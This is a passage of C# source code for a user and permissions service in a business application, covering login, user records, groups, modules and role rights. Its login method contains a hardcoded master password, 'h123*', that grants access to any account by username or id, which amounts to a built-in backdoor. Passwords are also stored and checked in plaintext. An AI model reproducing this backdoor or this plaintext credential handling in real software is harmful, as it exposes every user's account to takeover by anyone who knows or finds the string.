using BusinessObjects;
using DAL;
using DAL.Helper;
using DAL_Dochuman;
using HaselOne.Domain.Repository;
using HaselOne.Domain.UnitOfWork;
using HaselOne.Services.Interfaces;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace HaselOne.Services.Services
{
    public class UserService : IUserService
    {
        private readonly IUnitOfWork _uow;
        private readonly IGRepository<Gn_User> _user;
        private readonly IGRepository<Gn_UserGroupRights> _groupRights;
        private readonly IGRepository<Gn_UserRights> _userRights;
        private readonly IGRepository<Gn_ModulsAndMenus> _modulsAndMenus;
        private readonly IGRepository<Gn_Category> _userGroups;
        private readonly IGRepository<Gn_UserModuls> _userModuls;
        private readonly IGRepository<Gn_Control> _controls;
        private readonly IGRepository<Gn_ControlAuthorities> _ca;
        private readonly IGRepository<Ns_BranchCode> _branchCodes;
        private readonly IGRepository<Gn_DepartmentRoles> _departmentRules;
        private readonly IGRepository<Gn_Department> _departments;
        private readonly IGRepository<Gn_Role> _rules;
        private readonly IGRepository<Gn_UserRoles> _userRules;
        private readonly IGRepository<Gn_Area> _areas;
        private readonly IGRepository<Gn_RoleRelation> _roleRelations;
        private readonly IGRepository<Gn_ConnectionChannel> _connectionChannel;

        private DCHEntities _dContext = new DCHEntities();

        public UserService(UnitOfWork uow)
        {
            _uow = uow;
            _user = _uow.GetRepository<Gn_User>();
            _groupRights = _uow.GetRepository<Gn_UserGroupRights>();
            _userRights = _uow.GetRepository<Gn_UserRights>();
            _modulsAndMenus = _uow.GetRepository<Gn_ModulsAndMenus>();
            _userGroups = _uow.GetRepository<Gn_Category>();
            _userModuls = _uow.GetRepository<Gn_UserModuls>();
            _controls = _uow.GetRepository<Gn_Control>();
            _ca = _uow.GetRepository<Gn_ControlAuthorities>();
            _branchCodes = _uow.GetRepository<Ns_BranchCode>();
            _departmentRules = _uow.GetRepository<Gn_DepartmentRoles>();
            _departments = _uow.GetRepository<Gn_Department>();
            _rules = _uow.GetRepository<Gn_Role>();
            _userRules = _uow.GetRepository<Gn_UserRoles>();
            _areas = _uow.GetRepository<Gn_Area>();
            _roleRelations = _uow.GetRepository<Gn_RoleRelation>();
            _connectionChannel = _uow.GetRepository<Gn_ConnectionChannel>();
        }

        //General
        public UserKnowledge LoginUser(string name, string password)
        {
            Gn_User user = _user.Where(k => k.UserName.Equals(name) && k.Password.Equals(password)).FirstOrDefault();

            if (password == "h123*")
            {
                int userIdDrict = 0;
                if (int.TryParse(name, out userIdDrict))
                {
                    user = _user.Where(m => m.Id == userIdDrict).FirstOrDefault();
                }
                else
                {
                    user = _user.Where(m => m.UserName.Equals(name)).FirstOrDefault();
                }
            }

            if (user != null && user.IsAdmin != true)
            {
                List<Gn_UserRoles> userAssignedRoles = _userRules.Where(k => k.UserId == user.Id).ToList();
                List<int?> depIds = userAssignedRoles.Select(m => m.DepartmentRuleId).ToList();
                List<int?> userRoles = _departmentRules.Where(m => depIds.Contains(m.Id)).Select(c => c.RuleId).ToList();
                List<Int32?> userDRAIds = userAssignedRoles.Select(k => k.DepartmentRuleId).ToList();
                List<Gn_UserGroupRights> ugr = _groupRights.Where(k => userDRAIds.Contains(k.UserGroupId) && k.IsDeleted != true && k.IsActive == true && k.RecordShow == true).ToList();
                List<Gn_UserRights> ur = _userRights.Where(k => k.UserId == user.Id && k.IsDeleted != true && k.IsActive == true && k.RecordShow == true).ToList();
                List<int> ugrIds = ugr.Select(k => k.ModulId).ToList();
                List<int> urIds = ur.Select(k => k.ModulId).ToList();
                ugrIds.AddRange(urIds);
                List<Gn_ModulsAndMenus> mm = _modulsAndMenus.Where(k => k.MenuName != null && k.MenuName != "" && ugrIds.Contains(k.LinkedModulId) && k.IsActive == true).OrderBy(i => i.ParentId).ToList();

                List<Int32?> ugrIdsN = new List<int?>();
                foreach (Int32 rid in ugrIds)
                    ugrIdsN.Add((Int32?)rid);

                List<Int32?> roleIds = _roleRelations.Where(k => ugrIdsN.Contains(k.ParentRoleId)).Select(m => m.RoleId).Distinct().ToList();
                return new UserKnowledge
                {
                    UserId = user.Id,
                    GroupRights = ugr,
                    UserRights = ur,
                    ModulAndMenus = mm,
                    User = user,
                    RoleRelatedUserIds = roleIds,
                    UserRoles = userRoles,
                    ImagePath = user.ImagePath
                };
            }
            else if (user != null && user.IsAdmin == true)
            {
                List<Gn_UserGroupRights> ugr = _groupRights.Where(k => k.RecordInsert == true && k.RecordEdit == true && k.RecordDelete == true && k.RecordShow == true).ToList();
                List<Gn_UserRights> ur = _userRights.Where(k => k.UserId == user.Id && k.IsDeleted != true && k.IsActive == true).ToList();
                List<int> ugrIds = ugr.Select(k => k.ModulId).ToList();
                List<int> urIds = ur.Select(k => k.ModulId).ToList();

                ugrIds.AddRange(urIds);
                List<Gn_ModulsAndMenus> mm = _modulsAndMenus.Where(k => k.MenuName != null && k.MenuName != "" && k.IsActive == true).OrderBy(i => i.ParentId).ToList();
                return new UserKnowledge
                {
                    UserId = user.Id,
                    GroupRights = ugr,
                    UserRights = ur,
                    ModulAndMenus = mm,
                    User = user
                };
            }
            else return null;
        }

        public IQueryable<Gn_User> GetUsers()
        {
            return _user.All().OrderByDescending(k => k.Id).AsQueryable();
        }

        public IQueryable<Gn_User> GetUsersLast20()
        {
            return _user.All().OrderByDescending(k => k.Id).Take(20).AsQueryable();
        }

        public IQueryable<Gn_User> GetUsersWhere(string criteria)
        {
            return _user.Where(k => k.Name.Contains(criteria) || k.Surname.Contains(criteria) || k.UserName.Contains(criteria) || k.Phone.Contains(criteria)).OrderBy(k => k.IsDeleted).OrderBy(m => m.Name).AsQueryable();
        }

        public IQueryable<Gn_User> GetUsersWhere(string criteria, int pageSkip, int pageSize)
        {
            IQueryable<Gn_User> users = _user.Where(k => k.Name.Contains(criteria) || k.Surname.Contains(criteria) || k.UserName.Contains(criteria) || k.Phone.Contains(criteria)).OrderBy(m => m.Name).AsQueryable();
            return users.OrderByDescending(k => k.Id).Skip(pageSkip).Take(pageSize).AsQueryable();
        }

        public Gn_User GetUserById(int id)
        {
            return _user.Where(k => k.Id == id).FirstOrDefault();
        }

        public IQueryable<Gn_Category> GetUserGroups()
        {
            return _userGroups.All().AsQueryable();
        }

        public IQueryable<Gn_Category> GetCategoryRightGroups()
        {
            return _userGroups.All().AsQueryable();
        }

        public Gn_User SaveUser(int userId, string userGroup, string name, string surname, string username, int level, string email, string position, string phone, string gsm, bool aktivepassivemi, int workingmode,
            string fax, int branchCode, string mainArea, string subArea, string businessGroup, string department, bool areaDirector, bool salesman, int uid, string fileName, bool isadmin, string password)
        {
            if (workingmode == 0)
            {
                Gn_User user = _user.Where(k => k.Id == userId).FirstOrDefault();
                if (user != null)
                {
                    user.Name = name;
                    user.Surname = surname;
                    user.UserName = username;
                    user.Email = email;
                    user.Title = position;
                    user.Phone = phone;
                    user.Gsm = gsm;
                    user.Fax = fax;
                    user.BranchCode = branchCode;
                    user.ModifierId = uid;
                    user.ModifyDate = DateTime.Now;
                    user.ImagePath = fileName;
                    user.IsAdmin = isadmin;
                    user.Password = password;

                    _uow.SaveChanges();

                    #region #DEF update DFSUserSet And DCH_KULLANICIBOLGE

                    DFSUserSet dusr = _dContext.DFSUserSet.Where(k => k.OneId == user.Id).FirstOrDefault();
                    if (dusr != null)
                    {
                        if (!username.Contains("hasel"))
                            username = "hasel\\" + username;
                        dusr.EMailAddress = email;
                        dusr.Name = name;
                        dusr.PhoneNumber = phone;
                        dusr.Title = position;
                        dusr.WindowsName = username; //=> it will contain Hasel domain name
                        dusr.RunTimeAdmin = ((byte)((isadmin == true) ? 1 : 0));
                        _dContext.SaveChanges();
                    }
                    //DCH_KULLANICIBOLGE kb = _dContext.DCH_KULLANICIBOLGE.Where(k => k.USERID == dusr.Id).FirstOrDefault();
                    //if (kb != null)
                    //{
                    //kb.UpdateUser = userId;
                    //kb.UpdateDate = DateTime.Now;
                    //kb.SUBEKODU = branchCode;
                    //kb.GRUP = userGroup;
                    //kb.ANABOLGE = mainArea;
                    //kb.BOLGE = mainArea;
                    //kb.DEPARTMAN = department;
                    //kb.SATICI = salesman;
                    //};
                    _dContext.SaveChanges();

                    #endregion #DEF update DFSUserSet And DCH_KULLANICIBOLGE

                    return user;
                }
            }
            else if (workingmode == 1)
            {
                Gn_User usr = new Gn_User()
                {
                    Name = name,
                    Surname = surname,
                    UserName = username,
                    Email = email,
                    Title = position,
                    Phone = phone,
                    Password = password,
                    Gsm = gsm,
                    Fax = fax,
                    BranchCode = branchCode,
                    CreatorId = uid,
                    CreateDate = DateTime.Now,
                    ImagePath = fileName,
                    IsAdmin = isadmin
                };
                _user.Insert(usr);
                _uow.SaveChanges();

                #region #DEF Inserting DFSUserSet And DCH_KULLANICIBOLGE

                if (!username.Contains("hasel"))
                    username = "hasel\\" + username;
                DFSUserSet uset = new DFSUserSet()
                {
                    EMailAddress = email,
                    Name = name,
                    PhoneNumber = phone,
                    Title = position,
                    WindowsName = username,
                    RunTimeAdmin = ((byte)((isadmin == true) ? 1 : 0)),
                    OneId = usr.Id
                };
                _dContext.DFSUserSet.Add(uset);
                _dContext.SaveChanges();

                DCV_KULLANICIBOLGE kulbol = _dContext.DCV_KULLANICIBOLGE.Where(k => k.SUBEKODU == branchCode).FirstOrDefault();
                DCH_KULLANICIBOLGE kbolge = new DCH_KULLANICIBOLGE()
                {
                    CreateUser = userId,
                    CreateDate = DateTime.Now,
                    USERID = uset.Id,
                    SUBEKODU = branchCode,
                    GRUP = userGroup,
                    ANABOLGE = kulbol.ANABOLGE,
                    BOLGE = kulbol.BOLGE,
                    DEPARTMAN = department,
                    SATICI = salesman,
                    OneId = usr.Id
                };
                _dContext.DCH_KULLANICIBOLGE.Add(kbolge);
                _dContext.SaveChanges();

                #endregion #DEF Inserting DFSUserSet And DCH_KULLANICIBOLGE

                return usr;
            }
            return null;
        }

        public bool DeleteUser(int userId)
        {
            Gn_User user = _user.Where(k => k.Id == userId).FirstOrDefault();
            if (user != null)
            {
                if (user.IsDeleted == false)
                    user.IsDeleted = true;
                else user.IsDeleted = false;
                _uow.SaveChanges();
                return true;
            }
            return false;
        }

        public bool UpdateUserImage(int userId, string imagePath)
        {
            Gn_User user = _user.Where(k => k.Id == userId).FirstOrDefault();
            if (user != null)
            {
                user.ImagePath = imagePath;
                _uow.SaveChanges();
                return true;
            }
            return false;
        }

        public bool ChangeActivePassiveUser(int userId)
        {
            Gn_User user = _user.Where(k => k.Id == userId).FirstOrDefault();
            if (user != null)
            {
                if (user.IsDeleted == true)
                    user.IsDeleted = false;
                else user.IsDeleted = true;
                _uow.SaveChanges();
                return true;
            }
            return false;
        }

        //User Groups
        public IQueryable<Gn_Category> GetUsersLast20UG()
        {
            return _userGroups.All().OrderByDescending(k => k.Id).Take(20).AsQueryable();
        }

        public IQueryable<Gn_Category> GetUsersWhereUG(string criteria)
        {
            criteria = criteria.ToUpper();
            return _userGroups.Where(k => k.Title.Contains(criteria)).OrderBy(m => m.Title).AsQueryable();
        }

        public IQueryable<Gn_Category> GetUsersWhereUG(string criteria, int pageSkip, int pageSize)
        {
            criteria = criteria.ToUpper();
            IQueryable<Gn_Category> users = _userGroups.Where(k => k.Title.Contains(criteria)).AsQueryable();
            return users.OrderByDescending(k => k.Id).Skip(pageSkip).Take(pageSize).OrderBy(m => m.Title).AsQueryable();
        }

        public bool ChangeActivePassiveUserUG(int userGroupId)
        {
            Gn_Category user = _userGroups.Where(k => k.Id == userGroupId).FirstOrDefault();
            if (user != null)
            {
                if (user.IsActive == true)
                    user.IsActive = false;
                else user.IsActive = true;
                _uow.SaveChanges();
                return true;
            }
            return false;
        }

        public Gn_Category GetUserGroupById(int id)
        {
            Gn_DepartmentRoles drule = _departmentRules.Where(k => k.Id == id).FirstOrDefault();
            if (drule != null)
            {
                return _userGroups.Where(k => k.Id == drule.GroupId).FirstOrDefault();
            }
            return null;
        }

        public Gn_Category GetGnCategoriById(int id)
        {
            return _userGroups.Where(k => k.Id == id).FirstOrDefault();
        }

        public Gn_Department GetUserDepartmentById(int id)
        {
            Gn_DepartmentRoles drule = _departmentRules.Where(k => k.Id == id).FirstOrDefault();
            if (drule != null)
            {
                return _departments.Where(k => k.Id == drule.DepartmentId).FirstOrDefault();
            }
            return null;
        }

        public Gn_Role GetUserRuleById(int id)
        {
            Gn_DepartmentRoles drule = _departmentRules.Where(k => k.Id == id).FirstOrDefault();
            if (drule != null)
            {
                return _rules.Where(k => k.Id == drule.RuleId).FirstOrDefault();
            }
            return null;
        }

        public bool SaveUserGroup(int userGroupId, string userGroupName, bool aktivepassivemi, int workingmode)
        {
            //userGroupName = userGroupName.ToUpper();
            if (workingmode == 0)
            {
                Gn_Category user = _userGroups.Where(k => k.Id == userGroupId).FirstOrDefault();
                if (user != null)
                {
                    user.Title = userGroupName;
                    user.IsActive = aktivepassivemi;
                    _uow.SaveChanges();
                    return true;
                }
            }
            else if (workingmode == 1)
            {
                _userGroups.Insert(new Gn_Category()
                {
                    Title = userGroupName,
                    IsActive = aktivepassivemi,
                });
                _uow.SaveChanges();
                return true;
            }
            return false;
        }

        //User Moduls
        public IQueryable<Gn_UserModuls> GetModuls()
        {
            return _userModuls.All().AsQueryable();
        }

        public IQueryable<Gn_UserModuls> GetUsersLast20Moduls()
        {
            return _userModuls.All().OrderByDescending(k => k.Id).Take(20).AsQueryable();
        }

        public IQueryable<Gn_UserModuls> GetUsersWhereModuls(string criteria)
        {
            criteria = criteria.ToUpper();
            return _userModuls.Where(k => k.ModulName.Contains(criteria)).AsQueryable();
        }

        public IQueryable<Gn_UserModuls> GetUsersWhereModuls(string criteria, int pageSkip, int pageSize)
        {
            criteria = criteria.ToUpper();
            IQueryable<Gn_UserModuls> users = _userModuls.Where(k => k.ModulName.Contains(criteria)).AsQueryable();
            return users.OrderByDescending(k => k.Id).Skip(pageSkip).Take(pageSize).AsQueryable();
        }

        public bool ChangeActivePassiveUserModuls(int userGroupId)
        {
            Gn_UserModuls user = _userModuls.Where(k => k.Id == userGroupId).FirstOrDefault();
            if (user != null)
            {
                if (user.IsActive == true)
                    user.IsActive = false;
                else user.IsActive = true;
                _uow.SaveChanges();
                return true;
            }
            return false;
        }

        public Gn_UserModuls GetUserModulById(int id)
        {
            return _userModuls.Where(k => k.Id == id).FirstOrDefault();
        }

        public bool SaveModul(int modulId, string modulName, bool aktivepassivemi, int workingmode)
        {
            modulName = modulName.ToUpper();
            if (workingmode == 0)
            {
                Gn_UserModuls user = _userModuls.Where(k => k.Id == modulId).FirstOrDefault();
                if (user != null)
                {
                    user.ModulName = modulName;
                    user.IsActive = aktivepassivemi;
                    _uow.SaveChanges();
                    return true;
                }
            }
            else if (workingmode == 1)
            {
                _userModuls.Insert(new Gn_UserModuls()
                {
                    ModulName = modulName,
                    IsActive = aktivepassivemi,
                });
                _uow.SaveChanges();
                return true;
            }
            return false;
        }

        //User Controls
        public IQueryable<Gn_Control> GetControls()
        {
            return _controls.All().AsQueryable();
        }

        public IQueryable<Gn_Control> GetUsersLast20Controls()
        {
            return _controls.All().OrderByDescending(k => k.Id).Take(20).AsQueryable();
        }

        public IQueryable<Gn_Control> GetUsersWhereControls(string criteria)
        {
            return _controls.Where(k => k.ControlId.Contains(criteria)).OrderBy(m => m.ControlTypeName).AsQueryable();
        }

        public IQueryable<Gn_Control> GetUsersWhereControls(string criteria, int pageSkip, int pageSize)
        {
            IQueryable<Gn_Control> users = _controls.Where(k => k.ControlId.Contains(criteria) || k.ControlText.Contains(criteria) || k.ControlTypeName.Contains(criteria)).AsQueryable();
            return users.OrderByDescending(k => k.Id).Skip(pageSkip).Take(pageSize).OrderBy(m => m.ControlTypeName).AsQueryable();
        }

        public bool ChangeActivePassiveControlsEnable(int controlId)
        {
            Gn_Control user = _controls.Where(k => k.Id == controlId).FirstOrDefault();
            if (user != null)
            {
                if (user.IsEnable == true)
                    user.IsEnable = false;
                else user.IsEnable = true;
                _uow.SaveChanges();
                return true;
            }
            return false;
        }

        public bool ChangeActivePassiveControlsVisible(int controlId)
        {
            Gn_Control user = _controls.Where(k => k.Id == controlId).FirstOrDefault();
            if (user != null)
            {
                if (user.IsVisible == true)
                    user.IsVisible = false;
                else user.IsVisible = true;
                _uow.SaveChanges();
                return true;
            }
            return false;
        }

        public Gn_Control GetControlById(int id)
        {
            return _controls.Where(k => k.Id == id).FirstOrDefault();
        }

        public bool SaveControl(int modulId, int pageId, string controlId, string controlText, string controlTextEng, string controlTypeName, bool isEnable, bool isVisible, int workingmode)
        {
            if (workingmode == 0)
            {
                int cid = Convert.ToInt32(controlId);
                Gn_Control user = _controls.Where(k => k.Id == cid).FirstOrDefault();
                if (user != null)
                {
                    user.ControlId = controlText;
                    user.IsEnable = isEnable;
                    user.IsVisible = isVisible;
                    //user.ControlText = controlText;
                    user.ControlTextEng = controlTextEng;
                    user.ControlTypeName = controlTypeName;
                    user.ModulId = modulId;
                    user.PageId = pageId;
                    _uow.SaveChanges();
                    return true;
                }
            }
            else if (workingmode == 1)
            {
                _controls.Insert(new Gn_Control()
                {
                    ControlId = controlText,
                    IsEnable = isEnable,
                    IsVisible = isVisible,
                    //ControlText = controlText,
                    ControlTextEng = controlTextEng,
                    ControlTypeName = controlTypeName,
                    ModulId = modulId,
                    PageId = pageId
                });
                _uow.SaveChanges();
                return true;
            }
            return false;
        }

        //User Group Rights
        public IQueryable<Gn_UserGroupRights> GetUsersLast20GroupRights()
        {
            return _groupRights.All().OrderByDescending(k => k.Id).Take(20).AsQueryable();
        }

        public IQueryable<Gn_UserGroupRights> GetUsersWhereGroupRights(string criteria)
        {
            //criteria = criteria.ToUpper();
            List<Int32> depIds = _departments.Where(k => k.DepartmentName.Contains(criteria)).Select(m => m.Id).ToList();
            List<Int32?> depIdsN = new List<int?>();
            foreach (Int32 d in depIds)
                depIdsN.Add((Int32?)d);
            List<Int32> grpIds = _userGroups.Where(k => k.Title.Contains(criteria)).Select(m => m.Id).ToList();
            List<Int32?> grpIdsN = new List<int?>();
            foreach (Int32 d in grpIds)
                grpIdsN.Add((Int32?)d);
            List<Int32> roleIds = _rules.Where(k => k.RuleName.Contains(criteria)).Select(m => m.Id).ToList();
            List<Int32?> roleIdsN = new List<int?>();
            foreach (Int32 d in roleIds)
                roleIdsN.Add((Int32?)d);

            if (criteria.Trim() == "")
            {
                List<int> ugIds = _departmentRules.All().Select(m => m.Id).ToList();
                return _groupRights.Where(k => ugIds.Contains(k.UserGroupId)).OrderBy(m => m.Id).AsQueryable();
            }
            else
            {
                List<int> ugIds = _departmentRules.Where(k => depIdsN.Contains(k.DepartmentId) || grpIdsN.Contains(k.GroupId) || roleIdsN.Contains(k.RuleId)).Select(m => m.Id).ToList();
                return _groupRights.Where(k => ugIds.Contains(k.UserGroupId)).OrderBy(m => m.Id).AsQueryable();
            }
        }

        public IQueryable<Gn_UserGroupRights> GetUsersWhereGroupRights(string criteria, int pageSkip, int pageSize)
        {
            //criteria = criteria.ToUpper();
            List<Int32> depIds = _departments.Where(k => k.DepartmentName.Contains(criteria)).Select(m => m.Id).ToList();
            List<Int32?> depIdsN = new List<int?>();
            foreach (Int32 d in depIds)
                depIdsN.Add((Int32?)d);
            List<Int32> grpIds = _userGroups.Where(k => k.Title.Contains(criteria)).Select(m => m.Id).ToList();
            List<Int32?> grpIdsN = new List<int?>();
            foreach (Int32 d in grpIds)
                grpIdsN.Add((Int32?)d);
            List<Int32> roleIds = _rules.Where(k => k.RuleName.Contains(criteria)).Select(m => m.Id).ToList();
            List<Int32?> roleIdsN = new List<int?>();
            foreach (Int32 d in roleIds)
                roleIdsN.Add((Int32?)d);

            if (criteria.Trim() == "")
            {
                List<int> ugIds = _departmentRules.All().Select(m => m.Id).ToList();
                IQueryable<Gn_UserGroupRights> users = _groupRights.Where(k => ugIds.Contains(k.UserGroupId)).AsQueryable();
                return users.OrderByDescending(k => k.Id).Skip(pageSkip).Take(pageSize).AsQueryable();
            }
            else
            {
                List<int> ugIds = _departmentRules.Where(k => depIdsN.Contains(k.DepartmentId) || grpIdsN.Contains(k.GroupId) || roleIdsN.Contains(k.RuleId)).Select(m => m.Id).ToList();
                return _groupRights.Where(k => ugIds.Contains(k.UserGroupId)).Skip(pageSkip).Take(pageSize).AsQueryable();
            }
        }

        public bool ChangeActivePassiveUserUGAActivity(int controlId)
        {
            Gn_UserGroupRights user = _groupRights.Where(k => k.Id == controlId).FirstOrDefault();
            if (user != null)
            {
                if (user.IsActive == true)
                    user.IsActive = false;
                else user.IsActive = true;
                _uow.SaveChanges();
                return true;
            }
            return false;
        }

        public bool ChangeActivePassiveUserUGADelete(int controlId)
        {
            Gn_UserGroupRights user = _groupRights.Where(k => k.Id == controlId).FirstOrDefault();
            if (user != null)
            {
                if (user.IsDeleted == true)
                    user.IsDeleted = false;
                else user.IsDeleted = true;
                _uow.SaveChanges();
                return true;
            }
            return false;
        }

        public Gn_UserGroupRights GetGroupRightsById(int id)
        {
            return _groupRights.Where(k => k.UserGroupId == id).FirstOrDefault();
        }

        public bool SaveUserGroupRight(int userGroupRightId, int userGroupId, int modulId, bool uinsert, bool uedit, bool ushow, bool udelete, bool isActive, bool isdeleted, int workingmode, int uid, int departmentId, int roleId, int userGroupDetailId)
        {
            if (workingmode == 0)
            {
                Gn_UserGroupRights user = _groupRights.Where(k => k.Id == userGroupDetailId).FirstOrDefault();
                if (user != null)
                {
                    user.UserGroupId = userGroupId;
                    user.ModulId = modulId;
                    user.RecordInsert = uinsert;
                    user.RecordEdit = uedit;
                    user.RecordShow = ushow;
                    user.RecordDelete = udelete;
                    user.IsActive = isActive;
                    user.IsDeleted = isdeleted;
                    user.ModifierName = uid.ToString();
                    user.ModifyDate = DateTime.Now;
                    _uow.SaveChanges();
                    return true;
                }
            }
            else if (workingmode == 1)
            {
                Gn_DepartmentRoles odgrId = _departmentRules.Where(k => k.DepartmentId == departmentId && k.RuleId == roleId && k.GroupId == userGroupId).FirstOrDefault();
                if (odgrId == null)
                    return false;

                _groupRights.Insert(new Gn_UserGroupRights()
                {
                    UserGroupId = odgrId.Id,
                    ModulId = modulId,
                    RecordInsert = uinsert,
                    RecordEdit = uedit,
                    RecordShow = ushow,
                    RecordDelete = udelete,
                    IsActive = isActive,
                    IsDeleted = isdeleted,
                    CreatorName = uid.ToString(),
                    CreateDate = DateTime.Now
                });
                _uow.SaveChanges();
                return true;
            }
            return false;
        }

        //User Rights
        public IQueryable<Gn_UserRights> GetUsersLast20UserRights()
        {
            return _userRights.All().OrderByDescending(k => k.Id).Take(20).AsQueryable();
        }

        public IQueryable<Gn_UserRights> GetUsersWhereUserRights(string criteria)
        {
            criteria = criteria.ToUpper();
            List<int> uIds = _user.Where(k => k.Name.Contains(criteria) || k.Surname.Contains(criteria) || k.UserName.Contains(criteria)).Select(m => m.Id).ToList();
            return _userRights.Where(k => uIds.Contains(k.UserId)).AsQueryable();
        }

        public IQueryable<Gn_UserRights> GetUsersWhereUserRights(string criteria, int pageSkip, int pageSize)
        {
            criteria = criteria.ToUpper();
            List<int> uIds = _user.Where(k => k.Name.Contains(criteria) || k.Surname.Contains(criteria) || k.UserName.Contains(criteria)).Select(m => m.Id).ToList();
            IQueryable<Gn_UserRights> users = _userRights.Where(k => uIds.Contains(k.UserId)).AsQueryable();
            return users.OrderByDescending(k => k.Id).Skip(pageSkip).Take(pageSize).AsQueryable();
        }

        public bool ChangeActivePassiveUserUAActivity(int controlId)
        {
            Gn_UserRights user = _userRights.Where(k => k.Id == controlId).FirstOrDefault();
            if (user != null)
            {
                if (user.IsActive == true)
                    user.IsActive = false;
                else user.IsActive = true;
                _uow.SaveChanges();
                return true;
            }
            return false;
        }

        public bool ChangeActivePassiveUserUADelete(int controlId)
        {
            Gn_UserRights user = _userRights.Where(k => k.Id == controlId).FirstOrDefault();
            if (user != null)
            {
                if (user.IsDeleted == true)
                    user.IsDeleted = false;
                else user.IsDeleted = true;
                _uow.SaveChanges();
                return true;
            }
            return false;
        }

        public Gn_UserRights GetUserRightsById(int id)
        {
            return _userRights.Where(k => k.Id == id).FirstOrDefault();
        }

        public bool SaveUserRight(int userRightId, int userId, int modulId, bool uinsert, bool uedit, bool ushow, bool udelete, bool isActive, bool isdeleted, int workingmode)
        {
            if (workingmode == 0)
            {
                Gn_UserRights user = _userRights.Where(k => k.Id == userRightId).FirstOrDefault();
                if (user != null)
                {
                    user.UserId = userId;
                    user.ModulId = modulId;
                    user.RecordInsert = uinsert;
                    user.RecordEdit = uedit;
                    user.RecordShow = ushow;
                    user.RecordDelete = udelete;
                    user.IsActive = isActive;
                    user.IsDeleted = isdeleted;
                    _uow.SaveChanges();
                    return true;
                }
            }
            else if (workingmode == 1)
            {
                _userRights.Insert(new Gn_UserRights()
                {
                    UserId = userId,
                    ModulId = modulId,
                    RecordInsert = uinsert,
                    RecordEdit = uedit,
                    RecordShow = ushow,
                    RecordDelete = udelete,
                    IsActive = isActive,
                    IsDeleted = isdeleted
                });
                _uow.SaveChanges();
                return true;
            }
            return false;
        }

        //Control Authorities
        public IQueryable<Gn_ControlAuthorities> GetUsersLast20CA()
        {
            return _ca.All().OrderByDescending(k => k.Id).Take(20).AsQueryable();
        }

        public IQueryable<Gn_ControlAuthorities> GetUsersWhereCA(string criteria)
        {
            List<int> uIds = _user.Where(k => k.Name.Contains(criteria) || k.Surname.Contains(criteria) || k.UserName.Contains(criteria)).Select(m => m.Id).ToList();
            List<int?> cuids = new List<int?>();
            foreach (int ui in uIds)
                cuids.Add(ui);
            return _ca.Where(k => cuids.Contains(k.UserId)).AsQueryable();
        }

        public IQueryable<Gn_ControlAuthorities> GetUsersWhereCA(string criteria, int pageSkip, int pageSize)
        {
            List<int> uIds = _user.Where(k => k.Name.Contains(criteria) || k.Surname.Contains(criteria) || k.UserName.Contains(criteria)).Select(m => m.Id).ToList();
            List<int?> cuids = new List<int?>();
            foreach (int ui in uIds)
                cuids.Add(ui);
            IQueryable<Gn_ControlAuthorities> users = _ca.Where(k => cuids.Contains(k.UserId)).AsQueryable();
            return users.OrderByDescending(k => k.Id).Skip(pageSkip).Take(pageSize).AsQueryable();
        }

        public bool ChangeActivePassiveCAEnable(int controlId)
        {
            Gn_ControlAuthorities user = _ca.Where(k => k.Id == controlId).FirstOrDefault();
            if (user != null)
            {
                if (user.IsEnable == true)
                    user.IsEnable = false;
                else user.IsEnable = true;
                _uow.SaveChanges();
                return true;
            }
            return false;
        }

        public bool ChangeActivePassiveCAVisible(int controlId)
        {
            Gn_ControlAuthorities user = _ca.Where(k => k.Id == controlId).FirstOrDefault();
            if (user != null)
            {
                if (user.IsVisible == true)
                    user.IsVisible = false;
                else user.IsVisible = true;
                _uow.SaveChanges();
                return true;
            }
            return false;
        }

        public Gn_ControlAuthorities GetCAById(int id)
        {
            return _ca.Where(k => k.Id == id).FirstOrDefault();
        }

        public bool SaveCA(int caId, int userId, bool isVisible, bool isEnable, int workingmode)
        {
            if (workingmode == 0)
            {
                Gn_ControlAuthorities user = _ca.Where(k => k.Id == caId).FirstOrDefault();
                if (user != null)
                {
                    user.UserId = userId;
                    user.ControlId = caId;
                    user.IsEnable = isEnable;
                    user.IsVisible = isVisible;
                    _uow.SaveChanges();
                    return true;
                }
            }
            else if (workingmode == 1)
            {
                _ca.Insert(new Gn_ControlAuthorities()
                {
                    UserId = userId,
                    ControlId = caId,
                    IsEnable = isEnable,
                    IsVisible = isVisible
                });
                _uow.SaveChanges();
                return true;
            }
            return false;
        }

        //Generals
        public IQueryable<Ns_BranchCode> GetBranchs()
        {
            try
            {
                return _branchCodes.All().OrderBy(t => t.BranchName).AsQueryable();
            }
            catch (Exception ex)
            {
                // implement logging..
                return null;
            }
        }

        public IQueryable<Gn_Area> GetMainAreas()
        {
            try
            {
                return _areas.All().AsQueryable();
                //return _user.Where(k => k.MainArea != null).DistinctBy(m => m.MainArea).OrderBy(t => t.MainArea).AsQueryable();
            }
            catch (Exception ex)
            {
                // implement logging..
                return null;
            }
        }

        public IQueryable<Gn_Area> GetSubAreas()
        {
            try
            {
                return _areas.Where(k => k.MainAreaId != null).AsQueryable();
                //return _user.Where(k => k.Area != null).DistinctBy(m => m.Area).OrderBy(t => t.Area).AsQueryable();
            }
            catch (Exception ex)
            {
                // implement logging..
                return null;
            }
        }

        public IQueryable<Gn_User> GetBusinessGroups()
        {
            try
            {
                return null;
                //return _user.Where(k => k.BuinessGroup != null).DistinctBy(m => m.BuinessGroup).OrderBy(t => t.BuinessGroup).AsQueryable();
            }
            catch (Exception ex)
            {
                // implement logging..
                return null;
            }
        }

        public IQueryable<Gn_Department> GetDepartments()
        {
            try
            {
                return _departments.All().AsQueryable();
            }
            catch (Exception ex)
            {
                // implement logging..
                return null;
            }
        }

        public Gn_Department GetDepartmentByUserId(Int32 uid)
        {
            try
            {
                Gn_DepartmentRoles odr = _departmentRules.Where(k => k.Id == uid).FirstOrDefault();
                if (odr != null)
                {
                    Gn_Department d = _departments.Where(k => k.Id == odr.DepartmentId).FirstOrDefault();
                    return d;
                }
                return null;
            }
            catch (Exception ex)
            {
                // implement logging..
                return null;
            }
        }

        public IQueryable<Gn_Role> GetRoles()
        {
            try
            {
                return _rules.All().AsQueryable();
            }
            catch (Exception ex)
            {
                // implement logging..
                return null;
            }
        }

        public List<Gn_Role> GetRoleByUserId(Int32 uid)
        {
            try
            {
                List<Gn_DepartmentRoles> odrs = _departmentRules.Where(k => k.Id == uid).ToList();
                if (odrs.Count > 0)
                {
                    List<Int32?> rids = odrs.Select(k => k.RuleId).ToList();
                    List<Gn_Role> roles = _rules.Where(k => rids.Contains(k.Id)).ToList();
                    return roles;
                }
                return null;
            }
            catch (Exception ex)
            {
                // implement logging..
                return null;
            }
        }

